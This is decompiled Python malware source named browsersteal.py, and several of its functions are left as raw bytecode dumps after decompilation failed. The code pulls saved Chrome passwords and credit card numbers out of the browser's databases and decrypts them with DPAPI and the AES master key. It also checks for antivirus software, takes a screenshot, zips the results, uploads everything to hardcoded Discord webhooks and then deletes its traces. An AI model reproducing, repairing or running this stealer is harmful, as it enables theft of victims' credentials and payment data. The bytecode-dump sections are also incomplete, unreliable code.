# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: browsersteal.py
import os
if os.name != 'nt':
    exit()
import sys, shutil, sqlite3, pywintypes, win32gui, json, base64, requests, platform, zipfile, smtplib
import http.cookiejar as cookiejar
from urllib.parse import urlencode
import ctypes, ctypes.wintypes, win32con, win32api, cryptography
from shutil import copyfile
from email import encoders
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from PIL import ImageGrab
from dhooks import Webhook, File
from Crypto.Cipher import AES
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
hook = Webhook('https://discord.com/api/webhooks/847938779599732816/5qIZprHjvzpta7RnnHIsSoox_qY__rG29Oz_Fq_A01BXkqkr1ky7ZX31qpiX5zJbEmjs')
hooks = Webhook('https://discord.com/api/webhooks/847939057644339281/3bruU-Rx5H8Tk--Kmk5KMwjnSXVwEymC4RxsPOh10n_N-6Y7NyqJ9dN28effwybpRnTh')
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = 'Google\\Chrome\\User Data\\Default\\Login Data'
NONCE_BYTE_SIZE = 12

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def get_cipher(key):
    cipher = Cipher((algorithms.AES(key)),
      None,
      backend=(default_backend()))
    return cipher


def decryptionDPAPI(encrypted):
    import ctypes, ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
         (
          'cbData', ctypes.wintypes.DWORD),
         (
          'pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def unix_decrypt(encrypted):
    if sys.platform.startswith('linux'):
        password = 'peanuts'
        iterations = 1
    else:
        raise NotImplementedError
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    salt = 'saltysalt'
    iv = '                '
    length = 16
    key = PBKDF2(password, salt, length, iterations)
    cipher = AES.new(key, (AES.MODE_CBC), IV=iv)
    decrypted = cipher.decrypt(encrypted[3:])
    return decrypted[:-ord(decrypted[(-1)])]


def localdata_key--- This code section failed: ---

 L. 126         0  LOAD_CONST               None
                2  STORE_FAST               'jsn'

 L. 127         4  LOAD_GLOBAL              open
                6  LOAD_GLOBAL              os
                8  LOAD_ATTR                path
               10  LOAD_METHOD              join
               12  LOAD_GLOBAL              os
               14  LOAD_ATTR                environ
               16  LOAD_STR                 'LOCALAPPDATA'
               18  BINARY_SUBSCR    
               20  LOAD_STR                 'Google\\Chrome\\User Data\\Local State'
               22  CALL_METHOD_2         2  ''
               24  LOAD_STR                 'utf-8'
               26  LOAD_STR                 'r'
               28  LOAD_CONST               ('encoding', 'mode')
               30  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               32  SETUP_WITH           68  'to 68'
               34  STORE_FAST               'f'

 L. 128        36  LOAD_GLOBAL              json
               38  LOAD_METHOD              loads
               40  LOAD_GLOBAL              str
               42  LOAD_FAST                'f'
               44  LOAD_METHOD              readline
               46  CALL_METHOD_0         0  ''
               48  CALL_FUNCTION_1       1  ''
               50  CALL_METHOD_1         1  ''
               52  STORE_FAST               'jsn'
               54  POP_BLOCK        
               56  LOAD_CONST               None
               58  DUP_TOP          
               60  DUP_TOP          
               62  CALL_FUNCTION_3       3  ''
               64  POP_TOP          
               66  JUMP_FORWARD         84  'to 84'
             68_0  COME_FROM_WITH       32  '32'
               68  <49>             
               70  POP_JUMP_IF_TRUE     74  'to 74'
               72  <48>             
             74_0  COME_FROM            70  '70'
               74  POP_TOP          
               76  POP_TOP          
               78  POP_TOP          
               80  POP_EXCEPT       
               82  POP_TOP          
             84_0  COME_FROM            66  '66'

 L. 129        84  LOAD_FAST                'jsn'
               86  LOAD_STR                 'os_crypt'
               88  BINARY_SUBSCR    
               90  LOAD_STR                 'encrypted_key'
               92  BINARY_SUBSCR    
               94  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `DUP_TOP' instruction at offset 58


def aes_decrypt(encrypted_txt):
    encoded_key = localdata_key()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = decryptionDPAPI(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = get_cipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class ChromePassword:

    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.show_password(_temp_path)

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                pass
            else:
                name = row[1]
                value = self.chrome_decrypt(row[2])
                _info = 'HOSTNAME: %s\nUSER: %s\nPASSWORD: %s\n\n' % (
                 host, name, value)
                self.passwordList.append(_info)
        else:
            conn.close()
            os.remove(db_file)

    def chrome_decrypt--- This code section failed: ---

 L. 170         0  LOAD_GLOBAL              sys
                2  LOAD_ATTR                platform
                4  LOAD_STR                 'win32'
                6  COMPARE_OP               ==
                8  POP_JUMP_IF_FALSE   114  'to 114'

 L. 171        10  SETUP_FINALLY        92  'to 92'

 L. 172        12  LOAD_FAST                'encrypted_txt'
               14  LOAD_CONST               None
               16  LOAD_CONST               4
               18  BUILD_SLICE_2         2 
               20  BINARY_SUBSCR    
               22  LOAD_CONST               b'\x01\x00\x00\x00'
               24  COMPARE_OP               ==
               26  POP_JUMP_IF_FALSE    46  'to 46'

 L. 173        28  LOAD_GLOBAL              decryptionDPAPI
               30  LOAD_FAST                'encrypted_txt'
               32  CALL_FUNCTION_1       1  ''
               34  STORE_FAST               'decrypted_txt'

 L. 174        36  LOAD_FAST                'decrypted_txt'
               38  LOAD_METHOD              decode
               40  CALL_METHOD_0         0  ''
               42  POP_BLOCK        
               44  RETURN_VALUE     
             46_0  COME_FROM            26  '26'

 L. 175        46  LOAD_FAST                'encrypted_txt'
               48  LOAD_CONST               None
               50  LOAD_CONST               3
               52  BUILD_SLICE_2         2 
               54  BINARY_SUBSCR    
               56  LOAD_CONST               b'v10'
               58  COMPARE_OP               ==
               60  POP_JUMP_IF_FALSE    88  'to 88'

 L. 176        62  LOAD_GLOBAL              aes_decrypt
               64  LOAD_FAST                'encrypted_txt'
               66  CALL_FUNCTION_1       1  ''
               68  STORE_FAST               'decrypted_txt'

 L. 177        70  LOAD_FAST                'decrypted_txt'
               72  LOAD_CONST               None
               74  LOAD_CONST               -16
               76  BUILD_SLICE_2         2 
               78  BINARY_SUBSCR    
               80  LOAD_METHOD              decode
               82  CALL_METHOD_0         0  ''
               84  POP_BLOCK        
               86  RETURN_VALUE     
             88_0  COME_FROM            60  '60'
               88  POP_BLOCK        
               90  JUMP_ABSOLUTE       146  'to 146'
             92_0  COME_FROM_FINALLY    10  '10'

 L. 178        92  DUP_TOP          
               94  LOAD_GLOBAL              WindowsError
               96  <121>               110  ''
               98  POP_TOP          
              100  POP_TOP          
              102  POP_TOP          

 L. 179       104  POP_EXCEPT       
              106  LOAD_CONST               None
              108  RETURN_VALUE     
              110  <48>             
              112  JUMP_FORWARD        146  'to 146'
            114_0  COME_FROM             8  '8'

 L. 181       114  SETUP_FINALLY       126  'to 126'

 L. 182       116  LOAD_GLOBAL              unix_decrypt
              118  LOAD_FAST                'encrypted_txt'
              120  CALL_FUNCTION_1       1  ''
              122  POP_BLOCK        
              124  RETURN_VALUE     
            126_0  COME_FROM_FINALLY   114  '114'

 L. 183       126  DUP_TOP          
              128  LOAD_GLOBAL              NotImplementedError
              130  <121>               144  ''
              132  POP_TOP          
              134  POP_TOP          
              136  POP_TOP          

 L. 184       138  POP_EXCEPT       
              140  LOAD_CONST               None
              142  RETURN_VALUE     
              144  <48>             
            146_0  COME_FROM           112  '112'

Parse error at or near `<121>' instruction at offset 96

    def save_passwords--- This code section failed: ---

 L. 187         0  LOAD_GLOBAL              open
                2  LOAD_STR                 'C:\\ProgramData\\Passwords.txt'
                4  LOAD_STR                 'w'
                6  LOAD_STR                 'utf-8'
                8  LOAD_CONST               ('encoding',)
               10  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               12  SETUP_WITH           42  'to 42'
               14  STORE_FAST               'f'

 L. 188        16  LOAD_FAST                'f'
               18  LOAD_METHOD              writelines
               20  LOAD_FAST                'self'
               22  LOAD_ATTR                passwordList
               24  CALL_METHOD_1         1  ''
               26  POP_TOP          
               28  POP_BLOCK        
               30  LOAD_CONST               None
               32  DUP_TOP          
               34  DUP_TOP          
               36  CALL_FUNCTION_3       3  ''
               38  POP_TOP          
               40  JUMP_FORWARD         58  'to 58'
             42_0  COME_FROM_WITH       12  '12'
               42  <49>             
               44  POP_JUMP_IF_TRUE     48  'to 48'
               46  <48>             
             48_0  COME_FROM            44  '44'
               48  POP_TOP          
               50  POP_TOP          
               52  POP_TOP          
               54  POP_EXCEPT       
               56  POP_TOP          
             58_0  COME_FROM            40  '40'

Parse error at or near `DUP_TOP' instruction at offset 32


if __name__ == '__main__':
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
if os.path.exists('C:\\Program Files\\Windows Defender'):
    av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
    av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
    av = 'AVG'
if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
    av = 'Avira'
if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
    av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
    av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
    av = 'Comodo'
if os.path.exists('C:\\Program Files\\DrWeb'):
    av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
    av = 'ESET'
if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
    av = 'Grizzly Pro'
if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
    av = 'Kaspersky'
if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
    av = 'Malware fighter'
if os.path.exists('C:\\Program Files\\360\\Total Security'):
    av = '360 Total Security'
else:
    screen = ImageGrab.grab()
    screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
    screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
    screen.close()
    screenshot = File('C:\\ProgramData\\Screenshot.jpg')
    zname = 'C:\\\\ProgramData\\\\Passwords.zip'
    newzip = zipfile.ZipFile(zname, 'w')
    newzip.write('C:\\\\ProgramData\\\\Passwords.txt')
    newzip.write('C:\\\\ProgramData\\\\Screenshot.jpg')
    newzip.close()
    passwords = File('C:\\ProgramData\\Passwords.zip')
    hook.send('screenshot:', file=screenshot)
    hook.send('passwords:', file=passwords)
    os.remove('C:\\ProgramData\\Passwords.txt')
    os.remove('C:\\ProgramData\\Screenshot.jpg')
    os.remove('C:\\ProgramData\\Passwords.zip')

    def get_master_key--- This code section failed: ---

 L. 252         0  SETUP_FINALLY        86  'to 86'

 L. 253         2  LOAD_GLOBAL              open
                4  LOAD_GLOBAL              os
                6  LOAD_ATTR                environ
                8  LOAD_STR                 'USERPROFILE'
               10  BINARY_SUBSCR    
               12  LOAD_GLOBAL              os
               14  LOAD_ATTR                sep
               16  BINARY_ADD       
               18  LOAD_STR                 'AppData\\Local\\Google\\Chrome\\User Data\\Local State'
               20  BINARY_ADD       

 L. 254        22  LOAD_STR                 'r'
               24  LOAD_STR                 'utf-8'

 L. 253        26  LOAD_CONST               ('encoding',)
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  SETUP_WITH           66  'to 66'

 L. 254        32  STORE_FAST               'f'

 L. 255        34  LOAD_FAST                'f'
               36  LOAD_METHOD              read
               38  CALL_METHOD_0         0  ''
               40  STORE_FAST               'local_state'

 L. 256        42  LOAD_GLOBAL              json
               44  LOAD_METHOD              loads
               46  LOAD_FAST                'local_state'
               48  CALL_METHOD_1         1  ''
               50  STORE_FAST               'local_state'
               52  POP_BLOCK        
               54  LOAD_CONST               None
               56  DUP_TOP          
               58  DUP_TOP          
               60  CALL_FUNCTION_3       3  ''
               62  POP_TOP          
               64  JUMP_FORWARD         82  'to 82'
             66_0  COME_FROM_WITH       30  '30'
               66  <49>             
               68  POP_JUMP_IF_TRUE     72  'to 72'
               70  <48>             
             72_0  COME_FROM            68  '68'
               72  POP_TOP          
               74  POP_TOP          
               76  POP_TOP          
               78  POP_EXCEPT       
               80  POP_TOP          
             82_0  COME_FROM            64  '64'
               82  POP_BLOCK        
               84  JUMP_FORWARD        114  'to 114'
             86_0  COME_FROM_FINALLY     0  '0'

 L. 257        86  POP_TOP          
               88  POP_TOP          
               90  POP_TOP          

 L. 258        92  LOAD_GLOBAL              hook
               94  LOAD_METHOD              send
               96  LOAD_STR                 'chrome not installed, error.'
               98  CALL_METHOD_1         1  ''
              100  POP_TOP          

 L. 259       102  LOAD_GLOBAL              exit
              104  CALL_FUNCTION_0       0  ''
              106  POP_TOP          
              108  POP_EXCEPT       
              110  JUMP_FORWARD        114  'to 114'
              112  <48>             
            114_0  COME_FROM           110  '110'
            114_1  COME_FROM            84  '84'

 L. 260       114  LOAD_GLOBAL              base64
              116  LOAD_METHOD              b64decode
              118  LOAD_FAST                'local_state'
              120  LOAD_STR                 'os_crypt'
              122  BINARY_SUBSCR    
              124  LOAD_STR                 'encrypted_key'
              126  BINARY_SUBSCR    
              128  CALL_METHOD_1         1  ''
              130  STORE_FAST               'master_key'

 L. 261       132  LOAD_FAST                'master_key'
              134  LOAD_CONST               5
              136  LOAD_CONST               None
              138  BUILD_SLICE_2         2 
              140  BINARY_SUBSCR    
              142  STORE_FAST               'master_key'

 L. 262       144  LOAD_GLOBAL              ctypes
              146  LOAD_ATTR                windll
              148  LOAD_ATTR                crypt32
              150  LOAD_METHOD              CryptUnprotectData

 L. 263       152  LOAD_FAST                'master_key'
              154  LOAD_CONST               None
              156  LOAD_CONST               None
              158  LOAD_CONST               None
              160  LOAD_CONST               0
              162  BUILD_TUPLE_5         5 
              164  LOAD_CONST               1
              166  BINARY_SUBSCR    

 L. 262       168  CALL_METHOD_1         1  ''
              170  STORE_FAST               'master_key'

 L. 264       172  LOAD_FAST                'master_key'
              174  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `DUP_TOP' instruction at offset 56


    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password--- This code section failed: ---

 L. 276         0  SETUP_FINALLY        68  'to 68'

 L. 277         2  LOAD_FAST                'buff'
                4  LOAD_CONST               3
                6  LOAD_CONST               15
                8  BUILD_SLICE_2         2 
               10  BINARY_SUBSCR    
               12  STORE_FAST               'iv'

 L. 278        14  LOAD_FAST                'buff'
               16  LOAD_CONST               15
               18  LOAD_CONST               None
               20  BUILD_SLICE_2         2 
               22  BINARY_SUBSCR    
               24  STORE_FAST               'payload'

 L. 279        26  LOAD_GLOBAL              generate_cipher
               28  LOAD_FAST                'master_key'
               30  LOAD_FAST                'iv'
               32  CALL_FUNCTION_2       2  ''
               34  STORE_FAST               'cipher'

 L. 280        36  LOAD_GLOBAL              decrypt_payload
               38  LOAD_FAST                'cipher'
               40  LOAD_FAST                'payload'
               42  CALL_FUNCTION_2       2  ''
               44  STORE_FAST               'decrypted_pass'

 L. 281        46  LOAD_FAST                'decrypted_pass'
               48  LOAD_CONST               None
               50  LOAD_CONST               -16
               52  BUILD_SLICE_2         2 
               54  BINARY_SUBSCR    
               56  LOAD_METHOD              decode
               58  CALL_METHOD_0         0  ''
               60  STORE_FAST               'decrypted_pass'

 L. 282        62  LOAD_FAST                'decrypted_pass'
               64  POP_BLOCK        
               66  RETURN_VALUE     
             68_0  COME_FROM_FINALLY     0  '0'

 L. 283        68  DUP_TOP          
               70  LOAD_GLOBAL              Exception
               72  <121>               112  ''
               74  POP_TOP          
               76  STORE_FAST               'e'
               78  POP_TOP          
               80  SETUP_FINALLY       104  'to 104'

 L. 284        82  LOAD_GLOBAL              hook
               84  LOAD_METHOD              send
               86  LOAD_STR                 'password decryption: error, chrome < 80.'
               88  CALL_METHOD_1         1  ''
               90  POP_TOP          

 L. 285        92  POP_BLOCK        
               94  POP_EXCEPT       
               96  LOAD_CONST               None
               98  STORE_FAST               'e'
              100  DELETE_FAST              'e'
              102  JUMP_FORWARD        114  'to 114'
            104_0  COME_FROM_FINALLY    80  '80'
              104  LOAD_CONST               None
              106  STORE_FAST               'e'
              108  DELETE_FAST              'e'
              110  <48>             
              112  <48>             
            114_0  COME_FROM           102  '102'

Parse error at or near `<121>' instruction at offset 72


    def get_password--- This code section failed: ---

 L. 289         0  LOAD_GLOBAL              get_master_key
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'master_key'

 L. 290         6  LOAD_GLOBAL              os
                8  LOAD_ATTR                environ
               10  LOAD_STR                 'USERPROFILE'
               12  BINARY_SUBSCR    
               14  LOAD_GLOBAL              os
               16  LOAD_ATTR                sep
               18  BINARY_ADD       

 L. 291        20  LOAD_STR                 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'

 L. 290        22  BINARY_ADD       
               24  STORE_FAST               'login_db'

 L. 292        26  SETUP_FINALLY        44  'to 44'

 L. 293        28  LOAD_GLOBAL              shutil
               30  LOAD_METHOD              copy2
               32  LOAD_FAST                'login_db'

 L. 294        34  LOAD_STR                 'Loginvault.db'

 L. 293        36  CALL_METHOD_2         2  ''
               38  POP_TOP          
               40  POP_BLOCK        
               42  JUMP_FORWARD         66  'to 66'
             44_0  COME_FROM_FINALLY    26  '26'

 L. 295        44  POP_TOP          
               46  POP_TOP          
               48  POP_TOP          

 L. 296        50  LOAD_GLOBAL              hook
               52  LOAD_METHOD              send
               54  LOAD_STR                 "error, chrome isn't installed."
               56  CALL_METHOD_1         1  ''
               58  POP_TOP          
               60  POP_EXCEPT       
               62  JUMP_FORWARD         66  'to 66'
               64  <48>             
             66_0  COME_FROM            62  '62'
             66_1  COME_FROM            42  '42'

 L. 297        66  LOAD_GLOBAL              sqlite3
               68  LOAD_METHOD              connect
               70  LOAD_STR                 'Loginvault.db'
               72  CALL_METHOD_1         1  ''
               74  STORE_FAST               'conn'

 L. 298        76  LOAD_FAST                'conn'
               78  LOAD_METHOD              cursor
               80  CALL_METHOD_0         0  ''
               82  STORE_FAST               'cursor'

 L. 300        84  SETUP_FINALLY       206  'to 206'

 L. 301        86  LOAD_FAST                'cursor'
               88  LOAD_METHOD              execute

 L. 302        90  LOAD_STR                 'SELECT action_url, username_value, password_value FROM logins'

 L. 301        92  CALL_METHOD_1         1  ''
               94  POP_TOP          

 L. 303        96  LOAD_FAST                'cursor'
               98  LOAD_METHOD              fetchall
              100  CALL_METHOD_0         0  ''
              102  GET_ITER         
            104_0  COME_FROM           156  '156'
              104  FOR_ITER            202  'to 202'
              106  STORE_FAST               'r'

 L. 304       108  LOAD_FAST                'r'
              110  LOAD_CONST               0
              112  BINARY_SUBSCR    
              114  STORE_FAST               'url'

 L. 305       116  LOAD_FAST                'r'
              118  LOAD_CONST               1
              120  BINARY_SUBSCR    
              122  STORE_FAST               'username'

 L. 306       124  LOAD_FAST                'r'
              126  LOAD_CONST               2
              128  BINARY_SUBSCR    
              130  STORE_FAST               'encrypted_password'

 L. 307       132  LOAD_GLOBAL              decrypt_password

 L. 308       134  LOAD_FAST                'encrypted_password'
              136  LOAD_FAST                'master_key'

 L. 307       138  CALL_FUNCTION_2       2  ''
              140  STORE_FAST               'decrypted_password'

 L. 309       142  LOAD_FAST                'username'
              144  LOAD_STR                 ''
              146  COMPARE_OP               !=
              148  POP_JUMP_IF_TRUE    158  'to 158'
              150  LOAD_FAST                'decrypted_password'
              152  LOAD_STR                 ''
              154  COMPARE_OP               !=
              156  POP_JUMP_IF_FALSE   104  'to 104'
            158_0  COME_FROM           148  '148'

 L. 310       158  LOAD_GLOBAL              hook
              160  LOAD_METHOD              send
              162  LOAD_STR                 'URL: '
              164  LOAD_FAST                'url'
              166  BINARY_ADD       
              168  LOAD_STR                 '\nUSER: '
              170  BINARY_ADD       
              172  LOAD_FAST                'username'
              174  BINARY_ADD       

 L. 311       176  LOAD_STR                 '\nPASSWORD: '

 L. 310       178  BINARY_ADD       

 L. 311       180  LOAD_FAST                'decrypted_password'

 L. 310       182  BINARY_ADD       

 L. 311       184  LOAD_STR                 '\n'

 L. 310       186  BINARY_ADD       

 L. 311       188  LOAD_STR                 '**********'

 L. 310       190  BINARY_ADD       

 L. 311       192  LOAD_STR                 '\n'

 L. 310       194  BINARY_ADD       
              196  CALL_METHOD_1         1  ''
              198  POP_TOP          
              200  JUMP_BACK           104  'to 104'
              202  POP_BLOCK        
              204  JUMP_FORWARD        242  'to 242'
            206_0  COME_FROM_FINALLY    84  '84'

 L. 312       206  DUP_TOP          
              208  LOAD_GLOBAL              Exception
              210  <121>               240  ''
              212  POP_TOP          
              214  STORE_FAST               'e'
              216  POP_TOP          
              218  SETUP_FINALLY       232  'to 232'

 L. 313       220  POP_BLOCK        
              222  POP_EXCEPT       
              224  LOAD_CONST               None
              226  STORE_FAST               'e'
              228  DELETE_FAST              'e'
              230  JUMP_FORWARD        242  'to 242'
            232_0  COME_FROM_FINALLY   218  '218'
              232  LOAD_CONST               None
              234  STORE_FAST               'e'
              236  DELETE_FAST              'e'
              238  <48>             
              240  <48>             
            242_0  COME_FROM           230  '230'
            242_1  COME_FROM           204  '204'

 L. 315       242  LOAD_FAST                'cursor'
              244  LOAD_METHOD              close
              246  CALL_METHOD_0         0  ''
              248  POP_TOP          

 L. 316       250  LOAD_FAST                'conn'
              252  LOAD_METHOD              close
              254  CALL_METHOD_0         0  ''
              256  POP_TOP          

 L. 317       258  SETUP_FINALLY       274  'to 274'

 L. 318       260  LOAD_GLOBAL              os
              262  LOAD_METHOD              remove
              264  LOAD_STR                 'Loginvault.db'
              266  CALL_METHOD_1         1  ''
              268  POP_TOP          
              270  POP_BLOCK        
              272  JUMP_FORWARD        312  'to 312'
            274_0  COME_FROM_FINALLY   258  '258'

 L. 319       274  DUP_TOP          
              276  LOAD_GLOBAL              Exception
          278_280  <121>               310  ''
              282  POP_TOP          
              284  STORE_FAST               'e'
              286  POP_TOP          
              288  SETUP_FINALLY       302  'to 302'

 L. 320       290  POP_BLOCK        
              292  POP_EXCEPT       
              294  LOAD_CONST               None
              296  STORE_FAST               'e'
              298  DELETE_FAST              'e'
              300  JUMP_FORWARD        312  'to 312'
            302_0  COME_FROM_FINALLY   288  '288'
              302  LOAD_CONST               None
              304  STORE_FAST               'e'
              306  DELETE_FAST              'e'
              308  <48>             
              310  <48>             
            312_0  COME_FROM           300  '300'
            312_1  COME_FROM           272  '272'

Parse error at or near `<48>' instruction at offset 64


    def get_credit_cards--- This code section failed: ---

 L. 324         0  LOAD_GLOBAL              get_master_key
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'master_key'

 L. 325         6  LOAD_GLOBAL              os
                8  LOAD_ATTR                environ
               10  LOAD_STR                 'USERPROFILE'
               12  BINARY_SUBSCR    
               14  LOAD_GLOBAL              os
               16  LOAD_ATTR                sep
               18  BINARY_ADD       

 L. 326        20  LOAD_STR                 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Web Data'

 L. 325        22  BINARY_ADD       
               24  STORE_FAST               'login_db'

 L. 327        26  LOAD_GLOBAL              shutil
               28  LOAD_METHOD              copy2
               30  LOAD_FAST                'login_db'

 L. 328        32  LOAD_STR                 'CCvault.db'

 L. 327        34  CALL_METHOD_2         2  ''
               36  POP_TOP          

 L. 329        38  LOAD_GLOBAL              sqlite3
               40  LOAD_METHOD              connect
               42  LOAD_STR                 'CCvault.db'
               44  CALL_METHOD_1         1  ''
               46  STORE_FAST               'conn'

 L. 330        48  LOAD_FAST                'conn'
               50  LOAD_METHOD              cursor
               52  CALL_METHOD_0         0  ''
               54  STORE_FAST               'cursor'

 L. 332        56  SETUP_FINALLY       186  'to 186'

 L. 333        58  LOAD_FAST                'cursor'
               60  LOAD_METHOD              execute
               62  LOAD_STR                 'SELECT * FROM credit_cards'
               64  CALL_METHOD_1         1  ''
               66  POP_TOP          

 L. 334        68  LOAD_FAST                'cursor'
               70  LOAD_METHOD              fetchall
               72  CALL_METHOD_0         0  ''
               74  GET_ITER         
               76  FOR_ITER            182  'to 182'
               78  STORE_FAST               'r'

 L. 335        80  LOAD_FAST                'r'
               82  LOAD_CONST               1
               84  BINARY_SUBSCR    
               86  STORE_FAST               'username'

 L. 336        88  LOAD_FAST                'r'
               90  LOAD_CONST               4
               92  BINARY_SUBSCR    
               94  STORE_FAST               'encrypted_password'

 L. 337        96  LOAD_GLOBAL              decrypt_password

 L. 338        98  LOAD_FAST                'encrypted_password'
              100  LOAD_FAST                'master_key'

 L. 337       102  CALL_FUNCTION_2       2  ''
              104  STORE_FAST               'decrypted_password'

 L. 339       106  LOAD_FAST                'r'
              108  LOAD_CONST               2
              110  BINARY_SUBSCR    
              112  STORE_FAST               'expire_mon'

 L. 340       114  LOAD_FAST                'r'
              116  LOAD_CONST               3
              118  BINARY_SUBSCR    
              120  STORE_FAST               'expire_year'

 L. 341       122  LOAD_GLOBAL              hook
              124  LOAD_METHOD              send
              126  LOAD_STR                 'CARD-NAME: '
              128  LOAD_FAST                'username'
              130  BINARY_ADD       
              132  LOAD_STR                 '\nNUMBER: '
              134  BINARY_ADD       
              136  LOAD_FAST                'decrypted_password'
              138  BINARY_ADD       
              140  LOAD_STR                 '\nEXPIRY M: '
              142  BINARY_ADD       

 L. 342       144  LOAD_GLOBAL              str
              146  LOAD_FAST                'expire_mon'
              148  CALL_FUNCTION_1       1  ''

 L. 341       150  BINARY_ADD       

 L. 342       152  LOAD_STR                 '\nEXPIRY Y: '

 L. 341       154  BINARY_ADD       

 L. 342       156  LOAD_GLOBAL              str
              158  LOAD_FAST                'expire_year'
              160  CALL_FUNCTION_1       1  ''

 L. 341       162  BINARY_ADD       

 L. 342       164  LOAD_STR                 '\n'

 L. 341       166  BINARY_ADD       

 L. 342       168  LOAD_STR                 '**********'

 L. 341       170  BINARY_ADD       

 L. 342       172  LOAD_STR                 '\n'

 L. 341       174  BINARY_ADD       
              176  CALL_METHOD_1         1  ''
              178  POP_TOP          
              180  JUMP_BACK            76  'to 76'
              182  POP_BLOCK        
              184  JUMP_FORWARD        222  'to 222'
            186_0  COME_FROM_FINALLY    56  '56'

 L. 344       186  DUP_TOP          
              188  LOAD_GLOBAL              Exception
              190  <121>               220  ''
              192  POP_TOP          
              194  STORE_FAST               'e'
              196  POP_TOP          
              198  SETUP_FINALLY       212  'to 212'

 L. 345       200  POP_BLOCK        
              202  POP_EXCEPT       
              204  LOAD_CONST               None
              206  STORE_FAST               'e'
              208  DELETE_FAST              'e'
              210  JUMP_FORWARD        222  'to 222'
            212_0  COME_FROM_FINALLY   198  '198'
              212  LOAD_CONST               None
              214  STORE_FAST               'e'
              216  DELETE_FAST              'e'
              218  <48>             
              220  <48>             
            222_0  COME_FROM           210  '210'
            222_1  COME_FROM           184  '184'

 L. 347       222  LOAD_FAST                'cursor'
              224  LOAD_METHOD              close
              226  CALL_METHOD_0         0  ''
              228  POP_TOP          

 L. 348       230  LOAD_FAST                'conn'
              232  LOAD_METHOD              close
              234  CALL_METHOD_0         0  ''
              236  POP_TOP          

 L. 349       238  SETUP_FINALLY       254  'to 254'

 L. 350       240  LOAD_GLOBAL              os
              242  LOAD_METHOD              remove
              244  LOAD_STR                 'CCvault.db'
              246  CALL_METHOD_1         1  ''
              248  POP_TOP          
              250  POP_BLOCK        
              252  JUMP_FORWARD        292  'to 292'
            254_0  COME_FROM_FINALLY   238  '238'

 L. 351       254  DUP_TOP          
              256  LOAD_GLOBAL              Exception
          258_260  <121>               290  ''
              262  POP_TOP          
              264  STORE_FAST               'e'
              266  POP_TOP          
              268  SETUP_FINALLY       282  'to 282'

 L. 352       270  POP_BLOCK        
              272  POP_EXCEPT       
              274  LOAD_CONST               None
              276  STORE_FAST               'e'
              278  DELETE_FAST              'e'
              280  JUMP_FORWARD        292  'to 292'
            282_0  COME_FROM_FINALLY   268  '268'
              282  LOAD_CONST               None
              284  STORE_FAST               'e'
              286  DELETE_FAST              'e'
              288  <48>             
              290  <48>             
            292_0  COME_FROM           280  '280'
            292_1  COME_FROM           252  '252'

Parse error at or near `<121>' instruction at offset 190


    def get_password1--- This code section failed: ---

 L. 358         0  LOAD_GLOBAL              get_master_key
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'master_key'

